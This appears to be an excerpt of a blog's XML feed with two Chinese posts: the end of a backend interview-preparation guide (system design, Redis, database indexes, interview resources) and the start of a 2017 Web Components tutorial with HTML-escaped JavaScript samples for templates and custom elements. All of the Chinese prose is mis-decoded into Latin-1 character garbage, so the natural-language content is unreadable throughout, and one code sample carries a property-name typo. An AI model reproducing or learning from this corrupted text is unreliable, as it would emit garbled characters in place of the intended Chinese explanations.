å¯¦éš›æ¼”ç·´ç³»çµ±è¨­è¨ˆç›¸é—œçš„é¢è©¦é¡Œï¼Œæˆ‘æœƒæ¨è–¦ *Grokking the System Design Interview*ï¼Œé€™å€‹èª²ç¨‹æœƒå¸¶å¤§å®¶è¨­è¨ˆå„ç¨®çŸ¥åç³»çµ±ï¼Œä¸¦ä¸”ä¹Ÿæœƒèªªæ˜å¯¦éš›é‡åˆ°ç³»çµ±è¨­è¨ˆçš„é¢è©¦é¡Œï¼Œè¦æ€éº¼å›ç­”æ¯”è¼ƒå¥½ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„ä¸€äº›å¿ƒå¾—ï¼š

è·Ÿé¢è©¦å®˜ç¢ºå®šç³»çµ±éœ€è¦å“ªäº›åŠŸèƒ½
è©•ä¼° DAUï¼ˆDaily Active Userï¼‰ã€æµé‡ã€QPS &#x2F; TPSã€ç¡¬ç¢Ÿå„²å­˜ç©ºé–“ã€è¨˜æ†¶é«”ç©ºé–“ç­‰
è¨­è¨ˆ API
è¨­è¨ˆ Data Model
High Level Designï¼Œå¤§è‡´èªªæ˜ç³»çµ±éœ€è¦å“ªäº› Component
Detailed Designï¼Œé‡å°æ¯å€‹ API é€²è¡Œæ¶æ§‹è¨­è¨ˆï¼Œåƒæ˜¯å¾®ä¿¡ç™¼ç´…åŒ…è·Ÿæ¶ç´…åŒ…çš„æ¶æ§‹å°±ä¸å¤ªä¸€æ¨£ï¼Œæœ‰æ™‚æ›´ç´°ç·»çš„è¨­è¨ˆåƒæ˜¯å¦‚ä½•ç‚ºæ¯æ¢ Tweet ç”Ÿæˆ IDï¼Œé€™å…©å€‹å•é¡Œåˆ†åˆ¥åœ¨æˆ‘ä¸Šé¢æåˆ°çš„å…©å€‹èª²ç¨‹éƒ½æœ‰ã€‚

æœ€å¾Œè¦æ³¨æ„çš„æ˜¯ï¼Œç³»çµ±è¨­è¨ˆæ˜¯å€‹æ¼”é€²çš„éç¨‹ï¼Œä¸ç®¡åœ¨é¢è©¦ä¸­é‚„æ˜¯å¯¦éš›è¨­è¨ˆæ™‚éƒ½ä¸€æ¨£ï¼Œæ‰€ä»¥åœ¨é¢è©¦ä¸­è¦ä¸æ–·çš„è·Ÿé¢è©¦å®˜ä¾†å›è¨è«–ï¼Œä¸è¦ä¸€ç›´è‡ªé¡§è‡ªåœ°æƒ³è‘—è¦ä¸€æ­¥åˆ°ä½ï¼Œæœ‰ä»€éº¼æƒ³æ³•å°±å…ˆæ‹‹å‡ºä¾†è·Ÿé¢è©¦å®˜è¨è«–ï¼Œé¢è©¦å®˜é€šå¸¸æœƒå›ç­”é€™å€‹æ–¹æ³•å¯èƒ½æœ‰å“ªäº›å•é¡Œï¼Œç„¶å¾Œä½ å†æ ¹æ“šé€™äº›å•é¡Œæå‡ºè§£æ±ºæ–¹æ¡ˆã€‚
ç‰¹å®šè»Ÿé«”é¢è©¦å®˜é€šå¸¸æœƒä¾æ“šä½ åšéçš„å°ˆæ¡ˆä¾†æå•ç‰¹å®šè»Ÿé«”çš„å•é¡Œï¼Œåƒæ˜¯èªªæ˜æŸå€‹ç¶²é å°ˆæ¡ˆç”¨åˆ° Redis æ™‚ï¼Œé¢è©¦å®˜å¯èƒ½å°±æœƒå•ã€Œé‚£ä½ çŸ¥é“ Memcached å—ï¼Ÿä»–å€‘ä¹‹é–“æœ‰ä»€éº¼å·®ç•°ï¼Œç‚ºä»€éº¼é¸æ“‡ Redisï¼Ÿã€ï¼Œç„¶å¾Œå°±æœƒå‡ºç¾ä¸€ç³»åˆ—æ›´é€²éšçš„è€ƒé¡Œï¼Œåƒæ˜¯ã€Œä½ çŸ¥é“ Redis çš„ Sorted Set æ€éº¼å¯¦ç¾çš„å—ï¼Ÿè¤‡é›œåº¦å¦‚ä½•ï¼Ÿã€ç­‰ç­‰ã€‚æœ‰äº›æ‹›è˜èªªæ˜æœƒç‰¹åˆ¥æåˆ°åœ˜éšŠç”¨äº†å“ªäº›è»Ÿé«”ï¼Œé€™æ™‚å€™ä¹Ÿå¯ä»¥é‡å°é€™äº›è»Ÿé«”ç‰¹åˆ¥æº–å‚™ã€‚ä»¥ä¸‹åˆ—å‡ºç‰¹å®šè»Ÿé«”å¯èƒ½çš„é¢è©¦å•é¡Œï¼š

Database
MySQL v.s. PostgreSQL
Index æœ‰ä»€éº¼å¥½è™•ï¼ŸDatabase æ€éº¼åš Indexï¼Ÿç‚ºä»€éº¼ä¸è¦æ¯å€‹æ¬„ä½éƒ½åš Indexï¼Ÿ
BTree v.s. B+Tree
SQL ç›¸é—œçš„ä¸€äº›è€ƒé¡Œ
MySQL å¦‚ä½•å¯¦ç¾ Lockï¼Ÿ


Memory Database
Redis v.s. Memcached
Redis çš„ Sorted Set å¦‚ä½•å¯¦ç¾ï¼Ÿ


Nginx
Nginx çš„å¯¦ç¾åŸç†æ˜¯ä»€éº¼ï¼Ÿç‚ºä»€éº¼ä¸€å° Nginx Server å°±å¯èƒ½æ’ä¸Šè¬çš„ QPSï¼Ÿ



é¢ç¶“è³‡æºæœ€å¾Œä»‹ç´¹ä¸€ä¸‹æ‰¾é¢ç¶“çš„å¥½åœ°æ–¹ï½

LeetCode Discussï¼Œåœ¨ LeetCode çš„è¨è«–æ¿ä¸Šï¼Œå¸¸å¸¸æœƒæœ‰å„å¤§å…¬å¸çš„é¢è©¦åˆ†äº«ã€‚
ä¸€ç•ä¸‰åˆ†åœ°ï¼Œé€™å€‹ç¶²ç«™ä¸»è¦æ˜¯é‡å°å„å€‹å…¬å¸çš„é¢ç¶“ï¼Œé›–ç„¶æ˜¯ä»¥åŒ—ç¾çš„å…¬å¸ç‚ºä¸»ï¼Œä½†å¦‚æœå°æ–¼é€²ä¸–ç•Œç´šçš„å¤§å…¬å¸æœ‰èˆˆè¶£ï¼Œåœ¨ä¸Šé¢å¯ä»¥æ‰¾åˆ°å¾ˆå¤šè³‡æºã€‚
æ˜é‡‘ï¼Œé€™å€‹ç¶²ç«™å‰‡æ˜¯ä»¥æŸå€‹æŠ€è¡“çš„é¢ç¶“ç‚ºä¸»ï¼Œè©¦è‘—æœå°‹ã€ŒPython é¢ç»ã€ï¼Œå› ç‚ºæ˜¯å°å²¸ç¶²ç«™ï¼Œæ‰€ä»¥æœå°‹ä¸Šç”¨ç°¡é«”å­—ï¼Œæœƒæ¯”è¼ƒå®¹æ˜“æ‰¾åˆ°æƒ³è¦çš„è³‡æºã€‚

ç¸½çµé¢è©¦æ˜¯ä¸€å€‹äº’ç›¸é¸æ“‡çš„éç¨‹ï¼Œåˆ¥ç¸½è¦ºå¾—æ˜¯å…¬å¸åœ¨æŒ‘ä½ ï¼Œå…¶å¯¦ä½ ä¹Ÿåœ¨æŒ‘å…¬å¸ï¼å¦‚æœé¢è©¦å®˜å•ä½ æœ‰æ²’æœ‰ä»€éº¼å•é¡Œï¼Ÿåˆ¥èªªæ²’æœ‰ï¼Œè©¦è‘—å¤šå•é»å•é¡Œï¼Œç­è§£å…¬å¸æˆ–åœ˜éšŠçš„ç‹€æ³ï¼Œç•¢ç«Ÿé€²å»ä¸€é–“å…¬å¸å¾Œï¼Œç™¼è¦ºå…¬å¸ä¸å¥½è¦é›¢é–‹ï¼Œå¯èƒ½éƒ½è¦è€—ä¸ŠåŠå¹´çš„æ™‚é–“ï¼Œæ‰€ä»¥è¦æ…é¸å…¬å¸ï¼*Tech Interview Handbook* æœ‰ä¸€äº›é¢è©¦ä¸­å¯ä»¥åå•é¢è©¦å®˜çš„å•é¡Œå¯ä»¥åƒè€ƒã€‚å¤šé»è‡ªä¿¡ï¼Œå…¶å¯¦ä½ ä¹Ÿåœ¨é¢è©¦é¢è©¦å®˜ï¼ç¥å¤§å®¶é¢è©¦éƒ½é †åˆ©ï¼
é—œæ–¼ä½œè€…ï¼š@frankyang å¾Œç«¯å·¥ç¨‹å¸«ï¼Œç†±æ„›é–±è®€åŠå˜—è©¦æ–°ç§‘æŠ€
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Backend</tag>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title>2017ï¼Œè®“æˆ‘å€‘å†ä¾†çœ‹çœ‹ Web Components å§ï¼</title>
    <url>/2017/01/06/web-components/</url>
    <content><![CDATA[å‰è¨€å…ˆå‰ç ”ç©¶ Progressive Web App çš„æ™‚å€™å°±æœ‰æ³¨æ„åˆ° Web Components é€™å€‹æ±è¥¿ï¼Œä¹Ÿçœ‹éå…¬å¸å‰è¼©ä½¿ç”¨éï¼Œç”šè‡³åœ¨å‰é™£å­ GDG DevFest Taipei 2016 çš„å®˜æ–¹ç¶²ç«™å…§ï¼Œä¸åƒ…ä½¿ç”¨ PWAï¼Œä¹Ÿæ¡ç”¨äº† Web Components çš„æŠ€è¡“ï¼ˆç•¶ç„¶æ‡‰è©²æ˜¯ç”¨ Google çš„ Polymerï¼‰ä¾†æ­å»ºã€‚ä½†é‚„æ˜¯å¾ˆå°‘çœ‹äººä½¿ç”¨èˆ‡è«‡è«–ï¼Œæˆ‘è‡ªå·±ä¹Ÿæ˜¯å¾ä¾†æ²’æœ‰ä»”ç´°ç ”ç©¶éï¼ˆæ±—..
æˆ‘ç¨å¾®æœå°‹ä¸€ä¸‹ï¼Œå¤§éƒ¨åˆ†çš„ä»‹ç´¹æ–‡ç« éƒ½æ˜¯2013, 2014 å¹´çš„ï¼Œéäº†ä¸‰å¹´ï¼ŒWeb Components çš„ API éƒ½å¾ v0 ä¾†åˆ°äº† v1ã€‚é™¤äº†ç€è¦½å™¨çš„æ”¯æ´ç¨‹åº¦å¤–ï¼ŒReact è·Ÿ Vue ç­‰ç­‰çš„å´›èµ·ç›¸ä¿¡ä¹Ÿæ˜¯ä¸»å› ä¹‹ä¸€ï¼Œç•¢ç«Ÿï¼ŒReact å¯«èµ·ä¾†é€™éº¼çˆ½å¿«ï¼Œå¯¦åœ¨æ²’å¿…è¦å»å°ˆç ”ä¸€å€‹æ”¯æ´åº¦ä½ï¼Œè¤‡é›œåº¦ä¹Ÿä¸ä½çš„æŠ€è¡“å•Šï¼
ç­‰ç­‰ï¼Œé‚£æˆ‘å¯«é€™ç¯‡è¦å¹¹éº»â€¦
æ¬¸ä¸æ˜¯ï¼Œéƒ½å·²ç¶“ 2017 å¹´äº†ï¼Œæ–°çš„ä¸€å¹´ç¸½è¦æœ‰äº›æ–°çš„é–‹å§‹ï¼Œå‰›å‰›ä¹Ÿæåˆ°ï¼ŒAPI ç‰ˆæœ¬å¾ v0 é€²åŒ–åˆ° v1 äº†ï¼ŒåŠ ä¸Š ES6 çš„æ”¯æ´è¶Šä¾†è¶Šå¥½ï¼Œè¨±å¤šå¯«æ³•éƒ½æ›´æ¼‚äº®äº†ï¼Œæ˜¯å€‹å¥½æ™‚æ©Ÿä¾†èªè­˜ä¸€ä¸‹é€™å€‹å¼·å¤§çš„ web æ¨™æº–ï¼
ç‚ºä½•éœ€è¦ Web Components ?ä¸è«–æ˜¯ä»€éº¼æ¨£çš„ç¨‹å¼ï¼Œæ¨¡çµ„åŒ–åœ¨é–‹ç™¼ä¸Šéƒ½æ˜¯å¾ˆé‡è¦çš„ä¸€å€‹æ¦‚å¿µï¼Œå‰ç«¯å·¥ç¨‹ä¹Ÿä¸ä¾‹å¤–ï¼Œæˆ‘å€‘éƒ½æœƒå¸Œæœ›èƒ½å¤ å°‡ Web é–‹ç™¼éç¨‹ä¸­çš„ JS, CSS, HTML å°è£èµ·ä¾†ï¼Œä»¥ä¾¿å¾ŒçºŒé‡è¤‡ä½¿ç”¨ï¼Œè€Œéç¨‹ä¸­å°±æœƒå‡ºç¾ä¸€äº›ç¼ºé»ï¼š

js, css, html ä¸‰è€…çš„è³‡æºåœ¨æœ€ä¸€èˆ¬çš„ç¶²é é–‹ç™¼ä¸ŠåŸºæœ¬ä¸Šæ˜¯åˆ†é–‹ç®¡ç†ï¼Œä½ å¦‚æœæƒ³ç”¨åˆ¥äººçš„ libraryï¼Œå¯èƒ½é‚„éœ€è¦å…ˆè¼‰å…¥å°æ–¹éœ€è¦çš„ JQueryï¼Œinclude è©²å¥—ä»¶éœ€è¦çš„ cssï¼Œæœ€å¾Œæ‰èƒ½åœ¨ä½ çš„ HTML å…§åŠ å…¥ã€‚

Scope å•é¡Œï¼šå³ä¾¿æ˜¯ä½¿ç”¨ Reactï¼Œéƒ½æœ‰å¯èƒ½é­é‡åˆ°è‡ªå·±å¯¦ä½œçš„ component å› ç‚ºåˆ¥äººè¨­å®šçš„ CSS class name è¡çªè€Œå°è‡´ Style è®Šå‹•çš„æƒ…æ³ã€‚

ç›¸å®¹æ€§ï¼šå„å€‹ Framework é–“çš„ components åŸºæœ¬ä¸Šç„¡æ³•å…±ç”¨ï¼Œç•¶ä½ çš„èˆŠå°ˆæ¡ˆæƒ³ç§»æ¤åˆ° React ä¸Šé ­æ™‚ï¼Œå³ä¾¿æˆ‘å€‘å…ˆä¸ç®¡ React åœ¨ç‹€æ…‹ç®¡ç†çš„æ©Ÿåˆ¶ï¼Œå¾ˆå¤šå…ƒä»¶è¦èƒ½å¤ ç›¸å®¹çš„è©±ï¼Œä¹Ÿå¯èƒ½éœ€è¦é€é webpack ç­‰å„ç¨® hack çš„æ–¹å¼æ‰èƒ½æˆåŠŸã€‚


é—œæ–¼å‰å…©é»ï¼Œé€é React, Webpack èˆ‡ CSS Modules éƒ½å¯ä»¥æ‰¾åˆ°ç›¸å°æ‡‰çš„è§£æ³•ï¼Œè€Œç¬¬ä¸‰é»ç›¸ä¿¡é€éè¨±å¤š hack ä¹Ÿæ˜¯å¯ä»¥è§£æ±ºã€‚
è€Œ Web Components å‰‡æ˜¯å¸Œæœ›é€éè¦ç¯„ï¼Œç”¨æ›´å¥½æ›´æ–¹ä¾¿çš„æ–¹å¼ï¼Œè§£æ±ºé€™äº›å•é¡Œã€‚
Web Components æ˜¯ W3C æ“¬å®šçš„æ¨™æº–ç”±ä¸‹åˆ—å››å¤§è¦ç¯„çµ„æˆï¼š

HTML Templates
Custom Elements
Shadow DOM
HTML imports

å…¶ä¸­é™¤äº† HTML Templates å¤–ï¼Œçš†å°šè™•åœ¨ Drafts éšæ®µã€‚æ¥ä¸‹ä¾†æœƒä¸€ä¸€ä»‹ç´¹ã€‚
ä¸éé€™é‚Šè¦å…ˆæé†’ä¸€ä¸‹ï¼Œé›–ç„¶å‰›å‰›ç”¨ React ä¾†èˆ‰ä¾‹æ¯”è¼ƒï¼Œä½†å¯¦éš›ä¸Š React èˆ‡ Web Comoponent çœŸæ­£è¦è§£æ±ºçš„å•é¡Œæ˜¯ä¸åŒçš„ï¼ŒReact ä¸»æ—¨åœ¨æ–¼ state èˆ‡ view çš„ç‹€æ…‹ç®¡ç†æ–¹å¼ï¼Œè€Œ Web Components ä¸»åŠ›æ–¼æ•´é«”å…ƒä»¶çš„å°è£ï¼ŒåŒ…å« Scoped CSS ç­‰ç­‰ã€‚React component å…§ç”šè‡³å¯ä»¥è¼‰å…¥ Web Componentsï¼Œç•¢ç«Ÿ Web Components å¯ä»¥åªæ˜¯ Plain JS, HTML, CSSã€‚
å…ˆä¾†å€‹ Demoåœ¨é€²å…¥è¦ç¯„çš„ä»‹ç´¹å‰ï¼Œæ€•å¤§å®¶è¦ºå¾—æˆ‘é¨™å°éŒ¢ï¼Œå…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹ä¸€å€‹æœ€ç°¡å–®çš„ Web Component æœƒé•·ä»€éº¼æ¨£å­ã€‚æœ‰èˆˆè¶£çš„è©±å†å¾€ä¸‹çœ‹ï¼
JS Bin on jsbin.com
å¯ä»¥çœ‹åˆ°åœ¨ &lt;body&gt; çš„æœ€ä¸‹æ–¹ï¼Œæœ‰å€‹ &lt;gakki-div-template&gt; çš„ tagï¼Œé€™å°±æ˜¯æˆ‘ create å‡ºä¾†çš„ä¸€å€‹ç°¡å–®çš„ Web Componentsï¼Œtag å…§çš„æ–‡å­—å°±æœƒåƒ Meme ä¸€æ¨£é¡¯ç¤ºåœ¨åœ–ç‰‡ä¸Šæ–¹ã€‚è€Œåœ–ç‰‡ä»¥åŠæ¨™é¡Œæ–‡å­—èˆ‡ CSS éƒ½æ˜¯å°è£åœ¨è£¡é ­ï¼Œå°±ç®—æˆ‘åœ¨å¤–é¢å°ä¸€æ¨£çš„ class name è¨­å®šä¸åŒ styleï¼Œ(å³ä½¿æ˜¯ !importantï¼‰éƒ½ä¸æœƒå½±éŸ¿åˆ°ã€‚
æ•´æ®µ code æˆ‘åªæœ‰è¼‰å…¥ä¸€å€‹ polyfill çš„å¤–éƒ¨ js æª”æ¡ˆ webcomponents.min.jsï¼Œä½†å¦‚æœä½ æ˜¯ç”¨ Chrome 53 ä»¥ä¸Šç‰ˆæœ¬ï¼ŒåŸºæœ¬ä¸Šä¸éœ€è¦ä¹Ÿèƒ½æ­£å¸¸é‹ä½œã€‚
å¦å¤–ï¼Œæœƒå¯« Vue.js çš„è®€è€…å¯èƒ½æœƒè¦ºå¾—æœ‰é»é»çœ¼ç†Ÿï¼ŒåŸºæœ¬ä¸Š Vue.js çš„å¯«æ³•è·Ÿæ¦‚å¿µéƒ½è·Ÿ Web components é›·åŒï¼ŒVue.js ç­‰æ–¼æ˜¯è‡ªå·±å¯«äº†ä¸€å¥— Web Componentsï¼Œä¸¦ä¸”æä¾›æ›´å¥½çš„ç€è¦½å™¨æ”¯æ´ï¼Œæ‰€ä»¥å¦‚æœå–œæ­¡ Web Components çš„æœ‹å‹å€‘ï¼Œåœ¨æ¨™æº–çœŸçš„è¢«å„å®¶ç€è¦½å™¨å¯¦ä½œå‰ï¼Œå¯ä»¥å…ˆç”¨ç”¨ Vue.jsï¼
HTML TemplateTemplate çš„æ¦‚å¿µåœ¨è¨±å¤š Web Framework ç•¶ä¸­éƒ½æœ‰ï¼Œåƒæ˜¯ Django(python), EJS&#x2F;Jade (Express&#x2F;Node)ï¼Œé›–ç„¶ç”¨æ³•çš†æœ‰æ‰€ä¸åŒï¼Œä½†æ¦‚å¿µéƒ½æ˜¯å…±é€šçš„ï¼Œè€Œå·²ç¶“æˆç‚º HTML5 æ¨™æº–çš„ &lt;template&gt; ä¹Ÿä¸ä¾‹å¤–ã€‚
&lt;template id=&quot;mytemplate&quot;&gt;  &lt;img src=&quot;&quot; alt=&quot;great image&quot;&gt;  &lt;div class=&quot;comment&quot;&gt;&lt;/div&gt;&lt;/template&gt;

ä»¥ä¸Šè¿°çš„ template ä¾†èªªï¼Œæˆ‘å€‘åœ¨ html è£¡é¢å®£å‘Šä¸€å€‹ templateï¼Œè£¡é¢åŒ…å«ä¸€å€‹ &lt;img&gt; èˆ‡ &lt;div&gt; å…ƒä»¶ï¼Œåœ¨ç€è¦½å™¨è§£æ HTML æ–‡ä»¶æ™‚ï¼Œtemplate çš„ DOM ç‰©ä»¶ä¸¦ä¸æœƒç”Ÿæ•ˆï¼Œè£¡é ­åŒ…å«çš„ Javascript ä¹Ÿä¸æœƒåŸ·è¡Œï¼Œä½†æ˜¯æœƒç”¢ç”Ÿä¸€å€‹ cloneable çš„ DOM ç‰©ä»¶ï¼Œè®“ä½ åœ¨æ•´å€‹ web app çš„ç”Ÿå‘½é€±æœŸéƒ½èƒ½ä½¿ç”¨ã€‚
ä¾†çœ‹ä¸€å€‹ç°¡å–®çš„ä½¿ç”¨æƒ…å¢ƒï¼š
å‡è¨­æˆ‘å€‘è¦åšä¸€å€‹ç°¡å–®çš„ counterï¼Œè¨ˆç®— button çš„é»æ“Šæ¬¡æ•¸ï¼Œç„¶å¾Œæ¯æ¬¡éƒ½å°‡æ¬¡æ•¸æ–°å¢åˆ° button ä¸‹æ–¹çš„è©±ï¼Œå¯ä»¥æ€éº¼åšï¼Ÿ
å¯èƒ½æœƒç”¨å­—ä¸²ä¸²æ¥çš„æ–¹å¼ï¼š
JS Bin on jsbin.com
ä½†å¦‚æœæœ‰äº† template çš„å¹«åŠ©ï¼Œå¯ä»¥å°‡ HTML å­—ä¸²çš„éƒ¨åˆ†èˆ‡é‚è¼¯åˆ†é–‹ï¼š
JS Bin on jsbin.com
source: html5rocks-html-template
&lt;button onclick=&quot;useIt()&quot;&gt;Use me&lt;/button&gt;&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;&lt;script&gt;  function useIt() &#123;    const content = document.querySelector(&#x27;#counter-template&#x27;).content;    // Update something in the template DOM.    let span = content.querySelector(&#x27;span&#x27;);    span.textContent = parseInt(span.textContent) + 1;    document.querySelector(&#x27;#container&#x27;).appendChild(        document.importNode(content, true));  &#125;&lt;/script&gt;&lt;template id=&quot;counter-template&quot;&gt;  &lt;div&gt;Template used: &lt;span&gt;0&lt;/span&gt;&lt;/div&gt;&lt;/template&gt;

æˆ‘å€‘æº–å‚™äº†ä¸€å€‹ templateï¼Œid ç‚º counter-templateï¼Œåœ¨æ¯æ¬¡ button è¢«é»é¸æ™‚ï¼Œå¾ template ä¸­å–å¾—ç›®å‰çš„ contentï¼Œå°‡å…§å®¹åŠ ä¸€ä¹‹å¾Œå† append åˆ° document å…§ã€‚
é›–ç„¶é€™å€‹ä¾‹å­çœ‹èµ·ä¾†ï¼Œä½¿ç”¨ template åå€’é‚„è¦å¯«æ¯”è¼ƒå¤š codeï¼Œä½†æ˜¯å¦‚æœä½ ä»Šå¤©éœ€è¦ç”¢ç”Ÿçš„ template æ˜¯å¾ˆè¤‡é›œçš„ HTML çµæ§‹æ™‚ï¼Œtemplate çµ•å°å¯ä»¥ç‚ºä½ å¸¶ä¾†ä¸å°‘å¹«åŠ©çš„ã€‚
æˆ‘å€‘ä¹Ÿå¯ä»¥ç›´æ¥è¤‡è£½ template å…§å®¹ï¼š
const content = document.querySelector(&#x27;#counter-template&#x27;).content;  const copyedContent = content.cloneNode(true);document.body.appendChild(copyedContent);  

Custom ElementsCustom Elements API æ˜¯æ§‹æˆ Web Components çš„åŸºç¤ä¹‹ä¸€ï¼Œæœ‰äº†å®ƒçš„å¹«åŠ©ï¼Œæˆ‘å€‘å¯ä»¥è‡ªå·±ç”¨æœ€å–®ç´”çš„ JS&#x2F;HTML&#x2F;CSS ä¾†å‰µé€ æ–°çš„ HTML tagsï¼Œæˆ–æ˜¯ extend åˆ¥äººçš„ componentsï¼Œç”šè‡³æ˜¯æ“´å±•åŸæœ‰ç¾å­˜çš„ HTML tagsï¼›è€Œä¹Ÿå› ç‚ºå¯ä»¥è‡ªè¡Œå®šç¾© tag çš„åç¨±ï¼Œè®“æ¨™ç±¤èƒ½å¤ æ›´åŠ èªæ„åŒ–ã€‚
Chrome åœ¨ version 33 æ™‚å°±æœ‰æ¨å‡º v0 çš„ Custom Elementsï¼Œè€Œåˆ°äº†ç¾åœ¨ version 55ï¼Œå·²ç¶“æ¡ç”¨ v1 çš„ç‰ˆæœ¬ï¼Œé›–ç„¶è§€å¿µæ˜¯ä¸€æ¨£çš„ï¼Œä½†èªæ³•æœ‰è¨±å¤šå·®ç•°ï¼Œä»¥ä¸‹ä»‹ç´¹çš†ç‚º v1 ç‰ˆæœ¬ï¼Œä¸¦ä½¿ç”¨ ES6 çš„å¯«æ³•ã€‚
è¦æ–°å¢ä¸€å€‹è‡ªå®šç¾©çš„ HTML tag å¾ˆç°¡å–®ï¼š
class GakkiTemplate extends HTMLElement &#123;&#125;window.customElements.define(&#x27;gakki-div-template&#x27;, GakkiTemplate);

æˆ–æ˜¯å¯ä»¥ç”¨æš±åå‡½å¼çš„æ–¹å¼
window.customElements.define(&#x27;gakki-div-template&#x27;, class extends HTMLElement &#123;&#125;);

å…©ç¨®æ–¹å¼éƒ½å¯ä»¥è®“ä½ ç”¢ç”Ÿä¸€å€‹ &lt;gakki-div-template&gt;&lt;/gakki-div-template&gt; çš„ tagã€‚
å…¶ä¸­æˆ‘å€‘ç”¨åˆ° ES6 çš„ class èªæ³•ï¼Œä¾†ç¹¼æ‰¿ HTMLElementï¼Œé€™æ¨£åšå¯ä»¥è®“æˆ‘å€‘çš„ GakkitTemplate æ“æœ‰æ‰€æœ‰ DOM APIï¼Œä¸¦ä¸”è®“ä½ è‡ªå·±æ–°å¢ Method åˆ°ä½ å‰µå»ºçš„é€™å€‹ element çš„ DOM interface ä¸­ã€‚
æ‹¿æœ€å‰é¢çš„ Demo ä¾†èˆ‰ä¾‹ï¼Œå®£å‘Šå…ƒç´ çš„åœ°æ–¹æˆ‘å€‘å¯ä»¥ä¿®æ”¹æˆé€™æ¨£ï¼š
JS Bin on jsbin.com
è®Šå‹•æœ‰é»å¤šï¼Œæ²’é—œä¿‚æˆ‘å€‘æ…¢æ…¢è§£é‡‹ï¼š
class GakkiTemplate extends HTMLElement &#123;    ...      get light() &#123;    return this.hasAttribute(&#x27;light&#x27;);  &#125;  set light(val) &#123;    // Reflect the value of the light property as an HTML attribute.    if (val) &#123;      this.setAttribute(&#x27;light&#x27;, &#x27;&#x27;);    &#125; else &#123;      this.removeAttribute(&#x27;light&#x27;);    &#125;  &#125;  // Can define constructor arguments if you wish.  constructor() &#123;   ...  &#125;&#125;

é¦–å…ˆæ˜¯ get&#x2F;setï¼Œé€™å…©å€‹ method ä»£è¡¨è³¦äºˆ light é€™å€‹ property getter&#x2F;setter çš„åŠŸèƒ½ï¼Œé€™å€‹è¦åšä»€éº¼å‘¢ï¼Ÿ
å‡è¨­ç•¶åˆ¥äººä½¿ç”¨æˆ‘å€‘çš„ custom-element æ™‚ï¼Œæœ‰å¯èƒ½ä»–å€‘æœƒæƒ³è¦èƒ½é€éçµ¦äºˆ light é€™å€‹ property ä¾†è¨­å®šä»¥ä¸‹çš„ styleï¼š
gakki-div-template[light] &#123;    opacity: 0.5&#125;

ç•¶ç„¶å¦‚æœä»–ç›´æ¥è¨­å®š &lt;gakki-div-template light&gt;&lt;/gakki-div-template&gt; å°±å¯ä»¥åƒåˆ° styleï¼Œä½†å¤šæ•¸æ™‚å€™æˆ‘å€‘æœƒå¸Œæœ›èƒ½ç”¨ JS çš„æ–¹å¼ä¾†è¨­ç½®ï¼Œåƒæ˜¯ï¼š
var gakkiDiv = document.getElementsByTagName(&#x27;gakki-div-template&#x27;);gakkiDiv[0].light// æ­¤æ™‚æœƒè§¸ç™¼ getterï¼Œreturn this.hasAttribute(&#x27;light&#x27;);gakkiDiv[0].ligth = true;// æ­¤æ™‚æœƒè§¸ç™¼ setterï¼Œthis.setAttribute(&#x27;light&#x27;, &#x27;&#x27;);
æ­¤æ™‚æˆ‘å€‘çš„ custom-elements å°±éœ€è¦çµ¦äºˆ getter&#x2F;setter çš„ methodï¼Œä¸¦åœ¨å…¶ä¸­è¨­å®š this.setAttribute() çš„æ–¹å¼è®“æˆ‘å€‘çš„ elements åƒå¾—åˆ°è©² property çš„è¨­å®šã€‚ï¼ˆ Note: property çš„åç¨±è·Ÿ get&#x2F;set çš„åç¨±è¦ç›¸åŒï¼‰
å†ä¾†æ˜¯æ¯”è¼ƒç‰¹åˆ¥çš„å…©å€‹ methodï¼š
static get observedAttributes() &#123;    return [&#x27;add&#x27;];  &#125;...// Only called for the change attributes due to observedAttributesattributeChangedCallback(name, oldValue, newValue) &#123;    if (this.add) &#123;      this.addImg();    &#125;&#125;

é€éå®šç¾© static get observedAttributes() å¯ä»¥è®“æˆ‘å€‘çš„ element ç›£è½è©²è¨­å®šçš„ attributes æœ‰æ²’æœ‰è¢« consumer è¨­ç½®ï¼Œå¦‚æœæœ‰è®Šå‹•ï¼Œæœƒè§¸ç™¼ attributeChangedCallback() ä¾†åŸ·è¡Œæˆ‘å€‘æƒ³è¦çš„å‹•ä½œã€‚
é‚£ç•¶ç„¶ä¹Ÿå¯ä»¥åŠ å…¥è‡ªå®šç¾©çš„ methodï¼Œåƒæ˜¯é€™é‚Šçš„ addImg()ï¼›ä¹Ÿå¯ä»¥åœ¨ constructor çš„æ™‚å€™åŠ å…¥ EventListenerï¼Œ
// Setup a click listener on &lt;gakki-div-template&gt; itself.    this.addEventListener(&#x27;click&#x27;, e =&gt; &#123;           this.addImg();    &#125;);

Custom Elements - Life Cycle:Custom Elements æœ‰è‡ªå·±çš„ç”Ÿå‘½é€±æœŸï¼Œå‰è¿°çš„ attributeChangedCallback() ä¹Ÿæ˜¯å…¶ä¸­ä¹‹ä¸€ï¼š

constructorï¼šCustom Elements å»ºæ§‹å¼ï¼Œé€šå¸¸æœƒåœ¨é€™é‚Š create Shadow DOMã€‚

connectedCallbackï¼šç•¶ä½ æ’å…¥å…ƒä»¶åˆ° DOM æ™‚æœƒè¢«å‘¼å«ã€‚

disconnectedCallbackï¼šç•¶ä½ å¾ DOM ä¸­ç§»é™¤å…ƒç´ æ™‚æœƒè¢«å‘¼å«ï¼Œå¯ä»¥åœ¨é€™é‚Š remove Event listener ä¹‹é¡çš„ã€‚

attributeChangedCallback(attrName, oldVal, newVal)ï¼šç›£è½çš„å±¬æ€§æœ‰è®Šå‹•æ™‚æœƒè¢«å‘¼å«ã€‚

adoptedCallbackï¼šæ•´å€‹ custom element è¢«äººç”¨ document.adoptNode(el) å‘¼å«æ™‚è§¸ç™¼ã€‚


å¯ä»¥ç©ç©çœ‹ä¸Šè¿°ç¯„ä¾‹ï¼Œçœ‹çœ‹æˆ‘åšäº†ä»€éº¼ç„¡èŠçš„åŠŸèƒ½ (ç•¢ç«Ÿåªæ˜¯ç¯„ä¾‹éº» XD)ã€‚
é™¤äº† HTMLElement å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç¹¼æ‰¿åˆ¥äººæˆ–æ˜¯ä½ è‡ªå·±çš„ Custom-Elementsï¼š
